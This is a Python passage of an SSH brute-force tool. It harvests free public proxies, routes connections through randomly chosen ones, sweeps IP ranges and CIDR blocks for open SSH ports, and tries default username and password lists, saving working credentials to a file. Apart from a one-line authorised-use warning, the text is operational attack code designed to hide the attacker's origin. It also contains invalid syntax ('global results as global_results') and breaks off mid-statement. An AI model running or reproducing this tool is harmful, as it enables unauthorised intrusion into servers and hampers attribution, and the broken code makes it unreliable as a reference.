#!/usr/bin/env python3
"""
Enhanced SSH Penetration Testing Tool with Working Proxy Fetching
================================================================

A modernized SSH security testing tool with fresh proxy fetching,
real-time scanning display, and improved detection capabilities.

WARNING: This tool is for authorized security testing only!
Use only on systems you own or have explicit permission to test.
"""

import argparse
import json
import logging
import os
import random
import socket
import sys
import time
import threading
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple
import requests
from bs4 import BeautifulSoup
import paramiko
from paramiko import AuthenticationException, SSHException

# Color constants for console output
class Colors:
    RESET = '\033[0m'
    BOLD = '\033[1m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'

__version__ = "2.1.0"
__author__ = "Enhanced Security Tool"

# Global configuration
CONFIG = {
    'timeout': 10,
    'auth_timeout': 5,
    'max_threads': 50,
    'max_attempts': 3,
    'delay_between_attempts': 1,
    'verbose': False,
    'output_file': 'successful_logins.json',
    'log_file': 'ssh_tool.log',
    'proxy_timeout': 5
}

# Threading lock for shared resources
output_lock = threading.Lock()
results = []
proxy_stats = {'total': 0, 'working': 0, 'failed': 0}

class Logger:
    """Enhanced logging with colors and file output"""
    
    def __init__(self, verbose=False, log_file=None):
        self.verbose = verbose
        self.log_file = log_file
        
        if log_file:
            logging.basicConfig(
                filename=log_file,
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s',
                datefmt='%Y-%m-%d %H:%M:%S'
            )
            self.file_logger = logging.getLogger()
    
    def _log(self, message: str, color: str = "", prefix: str = "", to_file: bool = True):
        """Internal logging method"""
        colored_msg = f"{color}{prefix}{Colors.RESET}{message}"
        print(colored_msg)
        
        if to_file and hasattr(self, 'file_logger'):
            self.file_logger.info(f"{prefix}{message}")
    
    def info(self, message: str):
        self._log(message, Colors.BLUE, "[+] ")
    
    def success(self, message: str):
        self._log(message, Colors.GREEN, "[*] ")
    
    def warning(self, message: str):
        self._log(message, Colors.YELLOW, "[!] ")
    
    def error(self, message: str):
        self._log(message, Colors.RED, "[-] ")
    
    def debug(self, message: str):
        if self.verbose:
            self._log(message, Colors.CYAN, "[DEBUG] ")

class ProxyManager:
    """Manages proxy fetching, validation, and rotation"""
    
    def __init__(self, logger: Logger):
        self.logger = logger
        self.proxies = []
        self.working_proxies = []
        self.current_proxy_index = 0
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
        })
    
    def fetch_proxies_from_geonode(self) -> List[Dict]:
        """Fetch proxies from Geonode API"""
        proxies = []
        try:
            self.logger.info("Fetching proxies from Geonode API...")
            url = "https://proxylist.geonode.com/api/proxy-list?limit=500&page=1&sort_by=lastChecked&sort_type=desc"
            
            response = self.session.get(url, timeout=30)
            response.raise_for_status()
            
            data = response.json()
            
            if 'data' in data:
                for proxy_data in data['data']:
                    proxy = {
                        'ip': proxy_data.get('ip', ''),
                        'port': int(proxy_data.get('port', 0)),
                        'protocol': proxy_data.get('protocols', ['http'])[0] if proxy_data.get('protocols') else 'http',
                        'country': proxy_data.get('country', 'Unknown'),
                        'anonymity': proxy_data.get('anonymityLevel', 'Unknown'),
                        'last_checked': proxy_data.get('lastChecked', ''),
                        'source': 'geonode'
                    }
                    if proxy['ip'] and proxy['port']:
                        proxies.append(proxy)
                
                self.logger.success(f"Fetched {len(proxies)} proxies from Geonode API")
            else:
                self.logger.warning("No proxy data found in Geonode API response")
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Failed to fetch from Geonode API: {e}")
        except json.JSONDecodeError as e:
            self.logger.error(f"Failed to parse Geonode API response: {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error fetching from Geonode: {e}")
        
        return proxies
    
    def fetch_proxies_from_free_proxy_list(self) -> List[Dict]:
        """Fetch proxies from free-proxy-list.net"""
        proxies = []
        try:
            self.logger.info("Fetching proxies from free-proxy-list.net...")
            url = "https://free-proxy-list.net/en/"
            
            response = self.session.get(url, timeout=30)
            response.raise_for_status()
            
            soup = BeautifulSoup(response.content, 'html.parser')
            
            # Find the proxy table
            table = soup.find('table', {'class': 'table'})
            if not table:
                # Try alternative selectors
                table = soup.find('table')
            
            if table:
                rows = table.find_all('tr')[1:]  # Skip header row
                
                for row in rows:
                    cols = row.find_all('td')
                    if len(cols) >= 7:
                        try:
                            ip = cols[0].text.strip()
                            port = int(cols[1].text.strip())
                            country = cols[3].text.strip()
                            anonymity = cols[4].text.strip()
                            https_support = cols[6].text.strip().lower() == 'yes'
                            
                            proxy = {
                                'ip': ip,
                                'port': port,
                                'protocol': 'https' if https_support else 'http',
                                'country': country,
                                'anonymity': anonymity,
                                'last_checked': 'recent',
                                'source': 'free-proxy-list'
                            }
                            
                            if self._is_valid_ip(ip) and 1 <= port <= 65535:
                                proxies.append(proxy)
                                
                        except (ValueError, IndexError) as e:
                            continue
                
                self.logger.success(f"Fetched {len(proxies)} proxies from free-proxy-list.net")
            else:
                self.logger.warning("Could not find proxy table on free-proxy-list.net")
                
        except requests.exceptions.RequestException as e:
            self.logger.error(f"Failed to fetch from free-proxy-list.net: {e}")
        except Exception as e:
            self.logger.error(f"Unexpected error fetching from free-proxy-list: {e}")
        
        return proxies
    
    def _is_valid_ip(self, ip: str) -> bool:
        """Validate IP address format"""
        try:
            parts = ip.split('.')
            return len(parts) == 4 and all(0 <= int(part) <= 255 for part in parts)
        except:
            return False
    
    def validate_proxy(self, proxy: Dict) -> bool:
        """Validate if a proxy is working"""
        try:
            proxy_url = f"http://{proxy['ip']}:{proxy['port']}"
            proxies = {
                'http': proxy_url,
                'https': proxy_url
            }
            
            # Test with a simple HTTP request
            test_url = "http://httpbin.org/ip"
            response = requests.get(
                test_url,
                proxies=proxies,
                timeout=CONFIG['proxy_timeout'],
                verify=False
            )
            
            return response.status_code == 200
            
        except Exception:
            return False
    
    def validate_proxies_batch(self, proxies: List[Dict], max_workers: int = 20) -> List[Dict]:
        """Validate proxies in parallel"""
        working_proxies = []
        total = len(proxies)
        
        self.logger.info(f"Validating {total} proxies...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            # Submit validation tasks
            future_to_proxy = {executor.submit(self.validate_proxy, proxy): proxy for proxy in proxies}
            
            completed = 0
            for future in as_completed(future_to_proxy):
                proxy = future_to_proxy[future]
                completed += 1
                
                try:
                    is_working = future.result()
                    if is_working:
                        working_proxies.append(proxy)
                        proxy_stats['working'] += 1
                        self.logger.debug(f"✓ Working proxy: {proxy['ip']}:{proxy['port']}")
                    else:
                        proxy_stats['failed'] += 1
                    
                    # Show progress
                    if completed % 10 == 0 or completed == total:
                        percentage = (completed / total) * 100
                        working_count = len(working_proxies)
                        print(f"\r{Colors.CYAN}[PROGRESS]{Colors.RESET} Validated {completed}/{total} ({percentage:.1f}%) - Working: {working_count}", end='', flush=True)
                
                except Exception as e:
                    proxy_stats['failed'] += 1
                    self.logger.debug(f"Validation error for {proxy['ip']}:{proxy['port']}: {e}")
        
        print()  # New line after progress
        self.logger.success(f"Found {len(working_proxies)} working proxies out of {total}")
        return working_proxies
    
    def fetch_all_proxies(self) -> List[Dict]:
        """Fetch proxies from all sources"""
        all_proxies = []
        
        # Fetch from Geonode API
        geonode_proxies = self.fetch_proxies_from_geonode()
        all_proxies.extend(geonode_proxies)
        
        # Fetch from free-proxy-list.net
        free_list_proxies = self.fetch_proxies_from_free_proxy_list()
        all_proxies.extend(free_list_proxies)
        
        # Remove duplicates
        unique_proxies = []
        seen = set()
        for proxy in all_proxies:
            proxy_key = f"{proxy['ip']}:{proxy['port']}"
            if proxy_key not in seen:
                seen.add(proxy_key)
                unique_proxies.append(proxy)
        
        self.logger.info(f"Total unique proxies collected: {len(unique_proxies)}")
        proxy_stats['total'] = len(unique_proxies)
        
        # Validate proxies
        self.working_proxies = self.validate_proxies_batch(unique_proxies)
        self.proxies = self.working_proxies.copy()
        
        return self.working_proxies
    
    def get_random_proxy(self) -> Optional[Dict]:
        """Get a random working proxy"""
        if not self.working_proxies:
            return None
        return random.choice(self.working_proxies)
    
    def create_proxy_socket(self, target_host: str, target_port: int) -> Optional[socket.socket]:
        """Create a socket connection through a proxy"""
        proxy = self.get_random_proxy()
        if not proxy:
            return None
        
        try:
            # Create connection through HTTP proxy using CONNECT method
            proxy_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            proxy_sock.settimeout(CONFIG['timeout'])
            proxy_sock.connect((proxy['ip'], proxy['port']))
            
            # Send CONNECT request
            connect_request = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n\r\n"
            proxy_sock.send(connect_request.encode())
            
            # Read response
            response = proxy_sock.recv(4096).decode()
            if "200 Connection established" in response or "200 OK" in response:
                return proxy_sock
            else:
                proxy_sock.close()
                return None
                
        except Exception as e:
            self.logger.debug(f"Failed to create proxy connection through {proxy['ip']}:{proxy['port']}: {e}")
            return None

class SSHScanner:
    """SSH port scanner and brute forcer"""
    
    def __init__(self, logger: Logger, proxy_manager: Optional[ProxyManager] = None):
        self.logger = logger
        self.proxy_manager = proxy_manager
        self.scan_stats = {'attempted': 0, 'successful': 0, 'failed': 0}
    
    def scan_ssh_port(self, host: str, port: int = 22, use_proxy: bool = True) -> bool:
        """Scan if SSH port is open"""
        try:
            if use_proxy and self.proxy_manager:
                sock = self.proxy_manager.create_proxy_socket(host, port)
                if sock:
                    sock.close()
                    return True
                else:
                    # Fallback to direct connection
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(CONFIG['timeout'])
                    result = sock.connect_ex((host, port))
                    sock.close()
                    return result == 0
            else:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(CONFIG['timeout'])
                result = sock.connect_ex((host, port))
                sock.close()
                return result == 0
                
        except Exception as e:
            self.logger.debug(f"Port scan error for {host}:{port}: {e}")
            return False
    
    def attempt_ssh_login(self, host: str, port: int, username: str, password: str, use_proxy: bool = True) -> Optional[Dict]:
        """Attempt SSH login"""
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            sock = None
            if use_proxy and self.proxy_manager:
                sock = self.proxy_manager.create_proxy_socket(host, port)
            
            client.connect(
                hostname=host,
                port=port,
                username=username,
                password=password,
                timeout=CONFIG['auth_timeout'],
                allow_agent=False,
                look_for_keys=False,
                sock=sock
            )
            
            # Get server info
            transport = client.get_transport()
            server_version = transport.remote_version if transport else "Unknown"
            
            result = {
                'host': host,
                'port': port,
                'username': username,
                'password': password,
                'server_version': server_version,
                'timestamp': time.time(),
                'proxy_used': sock is not None
            }
            
            client.close()
            return result
            
        except AuthenticationException:
            return None
        except Exception as e:
            self.logger.debug(f"SSH connection error to {host}:{port}: {e}")
            return None
    
    def scan_target(self, host: str, port: int = 22, usernames: List[str] = None, passwords: List[str] = None) -> List[Dict]:
        """Scan a single target"""
        if usernames is None:
            usernames = ['root', 'admin', 'user', 'test', 'ubuntu', 'centos']
        if passwords is None:
            passwords = ['password', '123456', 'admin', 'root', '', 'password123', 'test']
        
        results = []
        
        # First check if SSH port is open
        print(f"{Colors.CYAN}[SCAN]{Colors.RESET} Checking SSH port on {host}:{port}...")
        if not self.scan_ssh_port(host, port):
            print(f"{Colors.RED}[-]{Colors.RESET} SSH port {port} closed on {host}")
            return results
        
        print(f"{Colors.GREEN}[+]{Colors.RESET} SSH port {port} open on {host}")
        
        # Try authentication
        total_attempts = len(usernames) * len(passwords)
        current_attempt = 0
        
        for username in usernames:
            for password in passwords:
                current_attempt += 1
                self.scan_stats['attempted'] += 1
                
                print(f"\r{Colors.YELLOW}[AUTH]{Colors.RESET} Trying {username}:{password} on {host} ({current_attempt}/{total_attempts})", end='', flush=True)
                
                result = self.attempt_ssh_login(host, port, username, password)
                if result:
                    results.append(result)
                    self.scan_stats['successful'] += 1
                    print(f"\n{Colors.GREEN}[SUCCESS]{Colors.RESET} Login successful: {username}:{password}@{host}:{port}")
                    
                    # Save result immediately
                    with output_lock:
                        global results as global_results
                        global_results.append(result)
                        self._save_results()
                else:
                    self.scan_stats['failed'] += 1
                
                # Small delay between attempts
                time.sleep(CONFIG['delay_between_attempts'])
        
        print()  # New line after attempts
        return results
    
    def _save_results(self):
        """Save results to file"""
        try:
            with open(CONFIG['output_file'], 'w') as f:
                json.dump(results, f, indent=2, default=str)
        except Exception as e:
            self.logger.error(f"Failed to save results: {e}")

def parse_target_list(target_input: str) -> List[str]:
    """Parse target input (IP, range, or file)"""
    targets = []
    
    if os.path.isfile(target_input):
        # Read from file
        try:
            with open(target_input, 'r') as f:
                targets = [line.strip() for line in f if line.strip()]
        except Exception as e:
            print(f"{Colors.RED}[-]{Colors.RESET} Error reading target file: {e}")
            return []
    else:
        # Single target or range
        if '/' in target_input:
            # CIDR notation
            try:
                import ipaddress
                network = ipaddress.IPv4Network(target_input, strict=False)
                targets = [str(ip) for ip in network.hosts()]
            except Exception as e:
                print(f"{Colors.RED}[-]{Colors.RESET} Invalid CIDR notation: {e}")
                return []
        elif '-' in target_input and target_input.count('.') == 3:
            # IP range like 192.168.1.1-192.168.1.10
            try:
                start_ip, end_ip = target_input.split('-')
                start_parts = [int(x) for x in start_ip.split('.')]
                end_parts = [int(x) for x in end_ip.split('.')]
                
                # Simple range implementation
                current = start_parts[:]
                while current <= end_parts:
                    targets.append('.'.join(map(str, current)))
                    current[3] += 1
                    if current[3] 
